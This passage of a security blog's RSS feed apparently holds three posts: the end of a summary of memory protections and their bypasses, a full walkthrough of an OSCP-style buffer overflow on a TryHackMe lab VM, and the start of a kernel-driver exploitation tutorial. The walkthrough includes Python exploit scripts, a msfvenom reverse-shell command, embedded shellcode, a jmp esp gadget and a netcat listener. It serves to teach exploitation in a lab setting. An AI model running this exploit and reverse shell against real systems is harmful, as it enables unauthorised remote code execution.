	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
└────╼ ldd test
	linux-vdso.so.1 (0x00007ffff7ffa000)
	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
</code></pre><p>Note that libc addresses remain the same on every execution. However, look what happens when ASLR is enabled:</p>
<pre><code>└────╼ ldd test
	linux-vdso.so.1 (0x00007ffe4ed82000)
	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5016311000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f5016702000)
└────╼ ldd test
	linux-vdso.so.1 (0x00007ffe621a3000)
	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc0abf36000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fc0ac327000)
└────╼ ldd test
	linux-vdso.so.1 (0x00007ffe377ac000)
	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1ec5854000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f1ec5c45000)
</code></pre><p>The addresses are different everytime! Libc is loaded dinamically in runtime. This makes the program smaller and makes updates on libc easier, as the program does not have to be recompiled upon every libc update. But when printf or gets is called upon, how does it know the address to call?</p>
<p>Well, PLT and GOT are the two answers. When the program calls a function - such as printf - it will not call libc&rsquo;s function directly. Instead, it will call a wrapper in the PLT:</p>
<pre><code>gdb-peda$ disass main
Dump of assembler code for function main:
...
   0x000000000040055b &lt;+46&gt;:	call   0x4003f0 &lt;printf@plt&gt;
...
</code></pre><p>Let&rsquo;s see what&rsquo;s up in 0x4003f0 address:</p>
<pre><code>gdb-peda$ disass 0x4003f0
Dump of assembler code for function printf@plt:
   0x00000000004003f0 &lt;+0&gt;:	jmp    QWORD PTR [rip+0x2005aa]        # 0x6009a0
   0x00000000004003f6 &lt;+6&gt;:	push   0x0
   0x00000000004003fb &lt;+11&gt;:	jmp    0x4003e0
End of assembler dump.
</code></pre><p>If we disassamble 0x6009a0, we get something in the GOT:</p>
<pre><code>gdb-peda$ disass 0x6009a0
Dump of assembler code for function _GLOBAL_OFFSET_TABLE_:
   0x0000000000600988:	test   al,0x7
   0x000000000060098a:	(bad)  
   0x000000000060098b:	add    BYTE PTR [rax],al
   0x000000000060098d:	add    BYTE PTR [rax],al
   0x000000000060098f:	add    BYTE PTR [rax+0x31],dh
   0x0000000000600992:	xor    al,0x24
   0x0000000000600994:	in     al,0x7f
   0x0000000000600996:	add    BYTE PTR [rax],al
   0x0000000000600998:	rex clc 
   0x000000000060099a:	adc    ah,BYTE PTR [rsp+riz*8]
   0x000000000060099d:	jg     0x60099f
   0x000000000060099f:	add    BYTE PTR [rax-0x41],dh
   0x00000000006009a2:	fsub   DWORD PTR [rbx]
   0x00000000006009a4:	in     al,0x7f
   0x00000000006009a6:	add    BYTE PTR [rax],al
   0x00000000006009a8:	nop
   0x00000000006009a9:	jno    0x600985
   0x00000000006009ab:	and    esp,esp
   0x00000000006009ad:	jg     0x6009af
   0x00000000006009af:	add    BYTE PTR [rax],al
End of assembler dump.
</code></pre><p>So what the hell is that?</p>
<p>Since the compiler does not know where to find printf, it makes a wrapper in a memory region just before .TEXT called PLT. This guy is a wrapper to the GOT, another memory region. That&rsquo;s where things get interesting.</p>
<p>On the first time printf is called on the GOT, it still does not know how to find the libc function. But it will try and find it. When it finds it in libc (a process called dynamic linking), it will redirect to that function&rsquo;s address. It will also rewrite itself so that in the next time printf is called it already knows where to find it.</p>
<p>A possible attack is to rewrite the PLT or the GOT so it overwrites the pointer to printf function, making it point to somewhere malicious. This can be achieved through an overflow or arbitrary write, for instance.</p>
<p>RELRO, or Relocation Read-Only, is fully enabled, it will prevent from writing in the PLT or GOT, making the forementioned attack impossible. However, it has an overhead to entirely populate the GOT before the main function gets executed.</p>
<p>There&rsquo;s no bypass to this mitigation that I know of. Except, of course, for using a different approach.</p>
<h2 id="pie">PIE</h2>
<p>Position Independent Executables (PIE) provides an extra layer of protection which makes return oriented programming very difficult. We have seen that ASLR will randomize a few parts of the program, but an adversary may still use the .TEXT region for gadgets. PIE randomizes the offset of almost every memory region in the binary. However, this causes a great performance overhead.</p>
<p>To bypass this mitigation, one must have a leaked address to calculate the offset and compensate.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Let&rsquo;s do a TL;DR here:</p>
<h3 id="stack-canary-1">Stack canary</h3>
<p>A semi-random 8 bytes long integer before the return address so it can&rsquo;t be overwritten by exploiting a stack buffer overflow.</p>
<p><strong>Pros</strong>: very effective against stack buffer overflow. The performance overhead is minimal.</p>
<p><strong>Cons</strong>: Does not protect against other memory corruption vulnerabilities.</p>
<p><strong>Bypass</strong>: Leak the canary.</p>
<h3 id="nx-1">NX</h3>
<p>Prevents a few regions of the memory (such as the stack and heap) to be executed. With this mitigation, an adversary is unable to put new code into the program and has to do a code-reusage attack.</p>
<p><strong>Pros</strong>: makes it impossible to add new code to the program. Prevent dangerous and unnecessary regions to be executed. The performance overhead is minimal.</p>
<p><strong>Cons</strong>: does not offer much protection, as ret2libc is a fairly easy bypass.</p>
<p><strong>Bypass</strong>: ret2lib, return oriented programming.</p>
<h3 id="aslr-1">ASLR</h3>
<p>Randomizes a few regions of the memory, such as stack, heap and libs.</p>
<p><strong>Pros</strong>: effective to mitigate ret2libc attacks. It has a reasonable performance overhead, but not an issue.</p>
<p><strong>Cons</strong>: does not prevent an adversary to use gadgets within the program.</p>
<p><strong>Bypass</strong>: gadgets in the program and address leak.</p>
<h3 id="relro-1">RELRO</h3>
<p>Constructs the GOT before the main function is called and makes it unwritable.</p>
<p><strong>Pros</strong>: kills attacks which relies on changing PLT or GOT.</p>
<p><strong>Cons</strong>: other attacks are still possible. There&rsquo;s a performance overhead.</p>
<p><strong>Bypass</strong>: none. Perhaps use another approach?</p>
<h3 id="pie-1">PIE</h3>
<p>Randomizes the entire program virtual memory.</p>
<p><strong>Pros</strong>: very effective against code-reuse attacks (such as return oriented programming).</p>
<p><strong>Cons</strong>: considerable performance overhead.</p>
<p><strong>Bypass</strong>: address leak.</p>
]]></content>
		</item>
		
		<item>
			<title>Cracking an OSCP-like buffer overflow</title>
			<link>https://mdanilor.github.io/posts/oscp-bof/</link>
			<pubDate>Thu, 24 Sep 2020 18:01:34 -0300</pubDate>
			
			<guid>https://mdanilor.github.io/posts/oscp-bof/</guid>
			<description>So my OSCP PWK lab starts next saturday. Throughout the last few months, I&amp;rsquo;ve been slowly preparing myself to start the lab. Solved dozens of CTF VMs on vulnhub and tryhackme. One VM that particularly caught my attention is hosted on TryHackMe, a brilliant platform for security enthusiasts and professionals to practice their skills. This VM is Buffer Overflow Prep, which, according to friends who have taken the exam, it&amp;rsquo;s pretty close to the OSCP exam BoF machine.</description>
			<content type="html"><![CDATA[<p>So my <a href="https://www.offensive-security.com/pwk-oscp/">OSCP PWK</a> lab starts next saturday. Throughout the last few months, I&rsquo;ve been slowly preparing myself to start the lab. Solved dozens of CTF VMs on vulnhub and tryhackme. One
VM that particularly caught my attention is hosted on <a href="https://tryhackme.com/">TryHackMe</a>, a brilliant platform for
security enthusiasts and professionals to practice their skills. This VM is <a href="https://tryhackme.com/room/bufferoverflowprep">Buffer Overflow Prep</a>,
which, according to friends who have taken the exam, it&rsquo;s pretty close to the OSCP exam BoF
machine.</p>
<p>The VM is pretty methodical: there are 10 BoF challenges pratically identical. I believe
the objective is to practice speed, rather than a CTF challenge (where you practice solving
puzzles and charades?). Before starting to crack this machine, let&rsquo;s first take a look
at how does a simple buffer overflow (just like it appears on OSCP exam) work. If you already know how
to exploit a simple BoF and are here for the writeup, you may skip this session. However,
this is not exactly a writeup, since I&rsquo;m gonna show how to solve only one challenge, not the entire machine. But
all challenges are identical: if you solve one, you&rsquo;ve solved them all.</p>
<h2 id="buffer-overflow-to-remote-code-execution">Buffer overflow to remote code execution</h2>
<p>Before we get started, let&rsquo;s first understand the scope of our problem. The OSCP buffer
overflow is pretty basic and hardly resembles the way it is actually exploited in real
life nowadays. The binary does not have stack protections: there&rsquo;s no canary and the
stack is executable. In addition, although you may find ASLR, you will also find at least
one lib which conveniently does not have ASLR. If you are new to binary exploitation and
buffer overflow and don&rsquo;t know much about these protections, don&rsquo;t worry! They are not
important at this point (well, they are disabled!). This is a very introductory binary
exploitation post. But, if you are curious, you can check <a href="/posts/memory-protections/">this</a> post I&rsquo;ve made on
memory protections.</p>
<p>Allright! How do we turn this buffer overflow into a remote code execution vulnerability?
When I started in infosec this seemed pretty magical. The answer to that lies in how the
memory is organized. I have done a similar explaination on how the stack works in
<a href="hello-kernel">my other post about kernel exploitation</a> which I&rsquo;ll replicate below with a few
slight modifications.</p>
<p>The stack is used to store, amongst other things, local statically alocated variables, register values and return addresses.</p>
<p>When a function is called (using the x86 call instruction), the current EIP (instruction pointer register) on the caller function is stored in the stack so the callee will be able to know where to return to. In the callee function prologue, the base pointer is also stored in the stack so it can be later recovered in the prologue.</p>
<p>Another notable aspect of the stack is that it grows from higher addresses to lower ones. So when you push two elements into the stack, the first element pushed should have a higher address than the second.</p>
<p>Ok, so let&rsquo;s try and visualize it:</p>
<pre><code>+------------------------+ Lower addresses
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
+------------------------+ Top of the stack
|                        | (Stack pointer)
|                        |
|                        |
|  Function A Variables  |
|                        |
|                        |
|                        |
+------------------------+ Base of the stack
|                        | (Base pointer)
|                        |
|    ...                 |
|                        |
|                        |
+------------------------+Higher addresses
</code></pre><p>Here we see the stack during the execution of some A function. Let&rsquo;s supose now that the A function calls a B function. The following should happen:</p>
<ul>
<li>The A function call instruction should push the return address into the stack so when B executes the RET instruction, it pops the return address from memory and sets the instruction pointer register to it.</li>
<li>The B function should push the base pointer into the stack so it can be restored upon return.</li>
</ul>
<p>The stack should look like this:</p>
<pre><code>+------------------------+ Lower addresses
|                        |
|                        |
|                        |
|                        |
|                        |
+------------------------+Top of stack
|                        |
|  Function B Variables  |
|                        |
+------------------------+Base of stack
|  Previous base pointer |
+------------------------+
|  Return address of A   |
+------------------------+
|                        |
|                        |
|                        |
|  Function A Variables  |
|                        |
|                        |
|                        |
+------------------------+
|                        |
|                        |
|    ...                 |
|                        |
|                        |
+------------------------+Higher addresses
</code></pre><p>So say there&rsquo;s a stack overflow in B. If the overflow is large enough, the attacker should be able to overwrite the previous base pointer and, more interestingly, the return address.</p>
<p>By overwriting the return address, when function B executes the RET instruction, instead of returning to A, the flow will be redirected to wherever the overwritten address controlled by the attacker points to, causing a flow hijack.</p>
<p>Because the stack is executable, we can actually put our payload in the stack
and use the overwritten return address to hijack the execution flow directly to
our payload. If the return address is overwritten to the address of our payload
in stack, it should be executed. However, it&rsquo;s pretty difficult to predict what&rsquo;s
the address of our payload in stack, since the program is running on a remote machine.</p>
<p>If we have a copy of the binary (and we have!), we can get the address of a <code>jmp esp</code>
instruction throughout the program (in the .TEXT section or in a LIB whithout ASLR
protection). Then, the return address will be overwritten to &ldquo;jmp esp&rdquo;. We just have
to make sure our payload is correctly put to where esp is pointing. After the <code>jmp esp</code>
instruction is called, the flow will be redirected to the payload.</p>
<p>Ok, maybe that&rsquo;s a little bit fuzzy&hellip; let&rsquo;s get our hands dirty and solve a challenge.</p>
<h2 id="firing-up-the-vm-and-exploiting-it">Firing up the VM and exploiting it</h2>
<p>We warm up our Kali Linux VM, start the TryHackme challenge and go!
First, allow me to introduce the environment. I have Kali Linux running in a VM:
<img src="/posts/oscp-bof-img/kali.png" alt="Kali Linux Environment"></p>
<p>From this environment, I can connect to the target machine via RDP (the
credentials are given in the TryHackme page):
<img src="/posts/oscp-bof-img/rdp.png" alt="RDP"></p>
<p>Following TryHackme instructions, we open the Immunity Debugger, which is the same
one used in the OSCP exam. It also comes with a plugin named Mona, which helps the
exploitation a bit.</p>
<p>In the debugger, we open the vulnerable binary and run it. This is what it looks like:
<img src="/posts/oscp-bof-img/immunity.png" alt="Immunity Debugger" title="Immunity Debugger"></p>
<p>According to TryHackme instructions, the binary listens to port 1337. Let&rsquo;s see:
<img src="/posts/oscp-bof-img/bin0.png" alt="Connecting to binary" title="Connecting to binary">
Ok. We try its game and enter HELP:
<img src="/posts/oscp-bof-img/bin1.png" alt="Connecting to binary" title="Connecting to binary">
Let&rsquo;s see this OVERFLOW1:
<img src="/posts/oscp-bof-img/bin2.png" alt="Connecting to binary" title="Connecting to binary">
Right. Since it is a known fact that this binary is vulnerable to buffer overflow,
one may try and trigger the overflow to cause a crash:
<img src="/posts/oscp-bof-img/bin3.png" alt="Connecting to binary" title="Connecting to binary">
On the debugger we may see that the program crashed and some interesting stuff:
<img src="/posts/oscp-bof-img/bin4.png" alt="Connecting to binary" title="Connecting to binary">
The stack pointer (ESP) points to a lot of As, exactly as we sent it. The
instruction pointer (EIP) value is 0x41414141, which is AAAA in hex. This
means we also control it somewhere along the buffer we sent.</p>
<p>We can figure out the offsets of EIP and ESP on our payload by using the tools
<a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb">pattern_create</a> and <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb">pattern_offset</a>.
Both come in Kali Linux and may be found in the directory <code>/usr/share/metasploit-framework/tools/exploit/</code>.
The former will create a string forming a pattern and the latter will read 4 bytes
of that pattern and tell the offset. First, we generate the string:
<img src="/posts/oscp-bof-img/pattern_create.png" alt="Pattern Create" title="Pattern create"></p>
<p>Then we send it:
<img src="/posts/oscp-bof-img/pattern_crash.png" alt="Pattern Create" title="Pattern create"></p>
<p><img src="/posts/oscp-bof-img/pattern_crash1.png" alt="Pattern Create" title="Pattern create"></p>
<p>As it may be observed, the ESP starts with 0Co1 and the value of
EIP is <code>0x6f43396e</code>. If we convert the EIP value to ASCII and account
for the endianess, this is what we get:</p>
<p><img src="/posts/oscp-bof-img/convertion.png" alt="Pattern Create" title="Pattern create"></p>
<p>Then <code>pattern_offset</code> can be used to retrieve the offsets of EIP and ESP:</p>
<p><img src="/posts/oscp-bof-img/offsets.png" alt="Pattern Create" title="Pattern create"></p>
<p>Finally, we do a python proof of concept which will connect to the vulnerable
server and send a payload which will not only crash, but confirm that our offsets
are reliable. The payload we&rsquo;ll send is:
<code>AAAA... (1978 As) ...AABBBBCCCCCCCCCCCCCCCC</code></p>
<p>When the program crash, the EIP should be BBBB (0x42424242) and ESP should
point to CCCCCCCCCCCCCCCC.</p>
<p>You may see the PoC below:</p>
<pre><code>import socket

ip = &quot;10.10.116.211&quot;
port = 1337
timeout = 5

payload = 'A'*1978 + 'B' * 4 + 'C' * 16

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
con = s.connect((ip, port))
s.recv(1024)

s.send(&quot;OVERFLOW1 &quot; + payload)

s.recv(1024)
s.close()

</code></pre><p>And BOOM:</p>
<p><img src="/posts/oscp-bof-img/boom.png" alt="Boom" title="Boom!"></p>
<p>Exactly as we predicted. Now we may hijack the execution flow. But first,
we need to worry about badchards!</p>
<h3 id="badchars">Badchars</h3>
<p>What are badchars? Where do they live? What do they eat?</p>
<p>Not all chars are good chars for your payload. For example, if your payload
has the <code>\0</code> char, somewhere along the way the program might confuse it with
the end of a string and drop everything after this character on your payload.</p>
<p>Another example is the carriage return character. This may signal the program
that the input has ended.</p>
<p>And a few other characters may spoil your payload if not removed. So before you
go any further, you should find these badchars and make sure your payload does not
contain any of them.</p>
<p>First, we should generate a script which will send all chars. Then we use mona
to find which chars are missing. The script below is an example:</p>
<pre><code>import socket

ip = &quot;10.10.116.211&quot;
port = 1337
timeout = 5

ignore_chars = [&quot;\x00&quot;]
badchars = &quot;&quot;
for i in range(256):
    if chr(i) not in ignore_chars:
        badchars += chr(i)


payload = &quot;A&quot; * 1982 + badchars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
con = s.connect((ip, port))
s.recv(1024)

s.send(&quot;OVERFLOW1 &quot; + payload)

s.recv(1024)
s.close()
</code></pre><p>Note that &ldquo;\x00&rdquo; is an obvious badchar (end of string). So we remove it.
All the other chars are sequentially sent at offset 1982 (place to where
ESP points).</p>
<p>Before the script is ran, mona requires some setup. First, we set its
working folder:
<code>!mona config -set workingfolder c:\mona\%p</code></p>
<p><img src="/posts/oscp-bof-img/mona-config0.png" alt="Mona config" title="Mona config"></p>
<p>Now we tell mona to create a bytearray. It will create a byte array from byte 0 to 255,
except for the ones we tell it to ignore (byte &ldquo;\x00&rdquo;, in this case):</p>
<p><code>!mona bytearray -b &quot;\x00&quot;</code></p>
<p><img src="/posts/oscp-bof-img/mona-bytearray.png" alt="Mona config" title="Mona config">
Note that the output is saved to <code>bytearray.bin</code>.</p>
<p>Finally, we run the script and ask mona to compare the bytes we sent to the bytes in memory:</p>
<p><code>!mona compare -f C:\mona\oscp\bytearray.bin -a esp</code></p>
<p><img src="/posts/oscp-bof-img/badchars.png" alt="Badchars" title="Bad chars"></p>
<p>Note that there are several consecutive badchars. It is not uncommon that one badchar will
mess with the next char, even if it is legit. One way to get the actual badchars is to repeat
the process several times, eliminating at each iteraction the first badchar that is not yet
ignored. We remove then <code>\x07</code> from the bytearrays and try again:</p>
<p><img src="/posts/oscp-bof-img/badchars2.png" alt="Badchars" title="Bad chars"></p>
<pre><code>import socket

ip = &quot;10.10.116.211&quot;
port = 1337
timeout = 5

ignore_chars = [&quot;\x00&quot;, &quot;\x07&quot;]
badchars = &quot;&quot;
for i in range(256):
    if chr(i) not in ignore_chars:
        badchars += chr(i)


payload = &quot;A&quot; * 1982 + badchars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
con = s.connect((ip, port))
s.recv(1024)

s.send(&quot;OVERFLOW1 &quot; + payload)

s.recv(1024)
s.close()

</code></pre><p>And we find out that <code>\x08</code> isn&rsquo;t a badchar after all:</p>
<p><img src="/posts/oscp-bof-img/badchars3.png" alt="Badchars" title="Bad chars"></p>
<p>After this process is iterated until the last badchar, we find out that the badchars
are actually <code>\x00\x07\x2e\xa0</code>.</p>
<h2 id="generating-a-shellcode-to-get-rce">Generating a shellcode to get RCE</h2>
<p>Now that we know the badchars and can put a payload in the stack (which is, luckly, executable),
we finally need to generate a payload which will turn into remote code execution. You can either
code it in C and compile, code it in assembly, or take advantage of the work of nice men and women
which made msfvenom possible:</p>
<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;your_ip_address&gt; LPORT=1234 EXITFUNC=thread -b &quot;\x00\x07\x2e\xa0&quot; -f python</code></p>
<p>Where <code>LHOST</code> is your ip address, <code>LPORT</code> a local port of your preference, <code>EXITFUNC=thread</code> indicates that it will spawn a new thread for this reverse shell (for stability!!!), <code>b</code> precedes the badchars and <code>-f python</code> indicates that the shellcode output should be in python. This is the result:</p>
<p><img src="/posts/oscp-bof-img/msfvenom.png" alt="msfvenom" title="msfvenom"></p>
<h2 id="triggering-the-shellcode">Triggering the shellcode</h2>
<p>We have a payload. We can put the payload in the right place of the stack. Now
we need to trigger this shellcode. One way to do this is the forementioned <code>jmp esp</code>
approach. Once again we use mona. This time to find a <code>jmp esp</code> gadget which will placed
in EIP to trigger the shellcode.</p>
<p><code>!mona jmp -r esp -cpb &quot;\x00\x07\x2e\xa0&quot;</code></p>
<p><img src="/posts/oscp-bof-img/gadget.png" alt="Gadgets" title="Gadgets"></p>
<p>Mona found a few executable addresses with the <code>jmp esp</code> instruction and ASLR disabled.
I chose 0x620511af for my exploit.</p>
<h2 id="pwning">pwning</h2>
<p>Our final exploit:</p>
<pre><code>import socket

ip = &quot;10.10.28.178&quot;
port = 1337
timeout = 5

padding = &quot;A&quot; * 1978
eip = &quot;\xaf\x11\x50\x62&quot; # Compensating for the endianess
nops = &quot;\x90&quot; * 32 # Give space for the payload to grow!
buf =  b&quot;&quot;
buf += b&quot;\xd9\xc3\xd9\x74\x24\xf4\x5e\xb8\x76\x3e\xf4\xe1\x33&quot;
buf += b&quot;\xc9\xb1\x52\x83\xc6\x04\x31\x46\x13\x03\x30\x2d\x16&quot;
buf += b&quot;\x14\x40\xb9\x54\xd7\xb8\x3a\x39\x51\x5d\x0b\x79\x05&quot;
buf += b&quot;\x16\x3c\x49\x4d\x7a\xb1\x22\x03\x6e\x42\x46\x8c\x81&quot;
buf += b&quot;\xe3\xed\xea\xac\xf4\x5e\xce\xaf\x76\x9d\x03\x0f\x46&quot;
buf += b&quot;\x6e\x56\x4e\x8f\x93\x9b\x02\x58\xdf\x0e\xb2\xed\x95&quot;
buf += b&quot;\x92\x39\xbd\x38\x93\xde\x76\x3a\xb2\x71\x0c\x65\x14&quot;
buf += b&quot;\x70\xc1\x1d\x1d\x6a\x06\x1b\xd7\x01\xfc\xd7\xe6\xc3&quot;
buf += b&quot;\xcc\x18\x44\x2a\xe1\xea\x94\x6b\xc6\x14\xe3\x85\x34&quot;
buf += b&quot;\xa8\xf4\x52\x46\x76\x70\x40\xe0\xfd\x22\xac\x10\xd1&quot;
buf += b&quot;\xb5\x27\x1e\x9e\xb2\x6f\x03\x21\x16\x04\x3f\xaa\x99&quot;
buf += b&quot;\xca\xc9\xe8\xbd\xce\x92\xab\xdc\x57\x7f\x1d\xe0\x87&quot;
buf += b&quot;\x20\xc2\x44\xcc\xcd\x17\xf5\x8f\x99\xd4\x34\x2f\x5a&quot;
buf += b&quot;\x73\x4e\x5c\x68\xdc\xe4\xca\xc0\x95\x22\x0d\x26\x8c&quot;
buf += b&quot;\x93\x81\xd9\x2f\xe4\x88\x1d\x7b\xb4\xa2\xb4\x04\x5f&quot;
buf += b&quot;\x32\x38\xd1\xf0\x62\x96\x8a\xb0\xd2\x56\x7b\x59\x38&quot;
buf += b&quot;\x59\xa4\x79\x43\xb3\xcd\x10\xbe\x54\xf8\xe9\xc3\x2f&quot;
buf += b&quot;\x94\xf3\xc3\x2b\xb7\x7d\x25\x59\x27\x28\xfe\xf6\xde&quot;
buf += b&quot;\x71\x74\x66\x1e\xac\xf1\xa8\x94\x43\x06\x66\x5d\x29&quot;
buf += b&quot;\x14\x1f\xad\x64\x46\xb6\xb2\x52\xee\x54\x20\x39\xee&quot;
buf += b&quot;\x13\x59\x96\xb9\x74\xaf\xef\x2f\x69\x96\x59\x4d\x70&quot;
buf += b&quot;\x4e\xa1\xd5\xaf\xb3\x2c\xd4\x22\x8f\x0a\xc6\xfa\x10&quot;
buf += b&quot;\x17\xb2\x52\x47\xc1\x6c\x15\x31\xa3\xc6\xcf\xee\x6d&quot;
buf += b&quot;\x8e\x96\xdc\xad\xc8\x96\x08\x58\x34\x26\xe5\x1d\x4b&quot;
buf += b&quot;\x87\x61\xaa\x34\xf5\x11\x55\xef\xbd\x32\xb4\x25\xc8&quot;
buf += b&quot;\xda\x61\xac\x71\x87\x91\x1b\xb5\xbe\x11\xa9\x46\x45&quot;
buf += b&quot;\x09\xd8\x43\x01\x8d\x31\x3e\x1a\x78\x35\xed\x1b\xa9&quot;


payload = padding + eip + nops + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
con = s.connect((ip, port))
s.recv(1024)

s.send(&quot;OVERFLOW1 &quot; + payload)

s.recv(1024)
s.close()
</code></pre><p>One important detail is to put NOPs (instructions that actually do nothing) before the
shellcode. It won&rsquo;t interfere with the payload. When a NOP gets executed, nothing happens. It jumps to the next instruction.</p>
<p>This is importante because the payload is directly in the memory address to which <code>ESP</code> points,
so a simple push or pop operation could corrupt the shellcode.</p>
<p>We listen with netcat <code>nc -nvlp 1234</code> and run the exploit. The result is absolute success:</p>
<p><img src="/posts/oscp-bof-img/pwned.png" alt="Pwned" title="Pwned"></p>
<h2 id="conclusion">Conclusion</h2>
<p>In this post we exploited an OSCP-like buffer overflow challenge from TryHackMe. I hope
it makes clear how to exploit this class of memory corruption vulnerability. The most
important part here is to learn the method and practice. This kind of challenge can be
solved following the steps below:</p>
<ul>
<li>Cause a crash to confirm it is a BoF vulnerability</li>
<li>Find EIP and ESP offsets</li>
<li>Find badchars</li>
<li>Generate payload</li>
<li>Find a <code>jmp esp</code> gadget</li>
<li>Put the gadget address in EIP offset and shellcode in ESP offset</li>
<li>Get shell</li>
</ul>
<p>Besides following these steps, one must be careful not to fall in the common mistakes, such
as forgetting to append NOPs before the shellcode, wrong badchars, forget to consider badchars
when generating the msfvenom payload, account for endianess or using the correct payload.</p>
<p>Finally, the secret is practice, practice, practice.</p>
]]></content>
		</item>
		
		<item>
			<title>Hello, kernel: Exploiting an intentionally vulnerable Linux driver</title>
			<link>https://mdanilor.github.io/posts/hello-kernel/</link>
			<pubDate>Tue, 28 Apr 2020 18:01:34 -0300</pubDate>
			
			<guid>https://mdanilor.github.io/posts/hello-kernel/</guid>
			<description>Hello, kernel: Exploiting an intentionally vulnerable Linux driver Intro and setup About a month ago I started doing some research during both my freetime and work hours (shout out to SiDi for allowing me the time!!!) on Kernel Linux exploitation. I find this to be not only a fascinating topic, but a very useful one too, since one of my primary functions at work is to assess the Android system.</description>
			<content type="html"><![CDATA[<h2 id="hello-kernel-exploiting-an-intentionally-vulnerable-linux-driver">Hello, kernel: Exploiting an intentionally vulnerable Linux driver</h2>
<h3 id="intro-and-setup">Intro and setup</h3>
<p>About a month ago I started doing some research during both my freetime and work hours (shout out to SiDi for allowing me the time!!!) on Kernel Linux exploitation. I find this to be not only a fascinating topic, but a very useful one too, since one of my primary functions at work is to assess the Android system.</p>
<p>Ok, so let&rsquo;s get started. By this time you should be at least a little familiar with C and stack overflow exploitation in userland. You should also have a Linux VM running on QEMU attached to GDB. If you don&rsquo;t know how to set this up, don&rsquo;t worry. I had no idea when I started this either. I&rsquo;ll leave you with two blogposts below, the first will show you how to set up a Linux VM on QEMU (it&rsquo;s the same setup I&rsquo;m using here) and the second will show how to attach GDB to it. In addition, I&rsquo;ll leave two more links which should get you familiar with basic kernel development. If you have never developed at least a &ldquo;hello&rdquo; driver or built your own kernel, you should start with these.</p>
<ul>
<li>[1] <a href="https://andrealmeid.com/post/2020-03-10-bootstrap-arch/">https://andrealmeid.com/post/2020-03-10-bootstrap-arch/</a></li>
<li>[2] <a href="http://nickdesaulniers.github.io/blog/2018/10/24/booting-a-custom-linux-kernel-in-qemu-and-debugging-it-with-gdb/">http://nickdesaulniers.github.io/blog/2018/10/24/booting-a-custom-linux-kernel-in-qemu-and-debugging-it-with-gdb/</a></li>
<li>[3] <a href="https://lkcamp.gitlab.io/lkcamp_docs/unicamp_group/boot/">https://lkcamp.gitlab.io/lkcamp_docs/unicamp_group/boot/</a> - check as many tutorials as you can!</li>
<li>[4] <a href="https://github.com/R3x/How2Kernel">https://github.com/R3x/How2Kernel</a> - Check out Labs 1 through 3.</li>
</ul>
<p>On my setup I&rsquo;m using archlinux 5.6.0+ with KASLR disabled. To disable it, just put <code>-append &quot;nokaslr&quot;</code> arg to your QEMU.
I know that disabling KASLR is a bit of a turnoff. However, I will go back to bypassing KASLR in future posts. For this time, I&rsquo;ll keep it disabled since it&rsquo;s a beginners guide.</p>
<h3 id="what-well-be-exploiting">What we&rsquo;ll be exploiting</h3>
<p>After I took interest on Kernel exploitation, I started looking for some research material. Fortunately, I was able to find plenty of good stuff. I started reading the brilliant book &ldquo;A Guide to Kernel Exploitation: Attacking the Core&rdquo;, but decided to pause my reading for a more practical approach. This repository was an excelent place to start:</p>
<p>[5] <a href="https://github.com/invictus-0x90/vulnerable_linux_driver">https://github.com/invictus-0x90/vulnerable_linux_driver</a></p>
<p>As stated by the owner, this is not a CTF. Rather, the vulnerabilities are pretty obvious in order for one to focus on exploitation.</p>
<p>So you should clone the repository and build it:
<code>make -C &lt;PATH-TO-LINUX-SOURCE-CODE&gt; M=$(pwd)</code></p>
<p>If you followed tonyk&rsquo;s tutorial on [1], you should have a shared folder between the host and the VM. That&rsquo;s where you should put the driver so you can load it from the VM.</p>
<h3 id="part-1-stack-overflow">Part 1: stack overflow</h3>
<p>In this repository, there are a few vulnerabilities to exploit (artibrary rw, UAF, etc). Today we&rsquo;ll be focusing on the stack overflow. In future posts I shall cover the other vulnerabilities in there, but let&rsquo;s stick with stack overflow for today as you may see the vulnerable code below:</p>
<pre><code>	static int buffer_overflow(char __user *buff)
        {
                char kernel_buff[512];
                size_t size;

                size = strlen(buff);

                printk(KERN_WARNING &quot;[x] Triggering buffer overflow [x]\n&quot;);

                /**
                * Pretty simple buffer overflow. We shouldnt be using memcpy to
                * start with, copy_from_user does bounds checking for us (hence
                * why its not used here).
                */
                memcpy(kernel_buff, buff, size);

                return 0;
	}
</code></pre><p>This function may be called from userland by using ioctl. If you don&rsquo;t know what I&rsquo;m talking about, check links [2], [3] and [4] before proceeding.</p>
<p>So we clearly have an overflow in the function above. The focus today will be on turning this buffer overflow into a privilege escalation.</p>
<h3 id="the-stack">The stack</h3>
<p>Since our example relies on a stack overflow, we should understand how the stack works.</p>
<p>The stack is used to store, amongst other things, local statically alocated variables, register values and return addresses.</p>
<p>When a function is called (using the x86 call instruction), the current RIP (instruction pointer register) on the caller function is stored in the stack so the callee will be able to know where to return to. In the callee function prologue, the base pointer is also stored in the stack so it can be later recovered in the prologue.</p>
<p>Another notable aspect of the stack is that it grows from higher addresses to lower ones. So when you push two elements into the stack, the first element pushed should have a higher address than the second.</p>
<p>Ok, so let&rsquo;s try and visualize it:</p>
<pre><code>+------------------------+ Lower addresses
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
|                        |
+------------------------+ Top of the stack
|                        | (Stack pointer)
|                        |
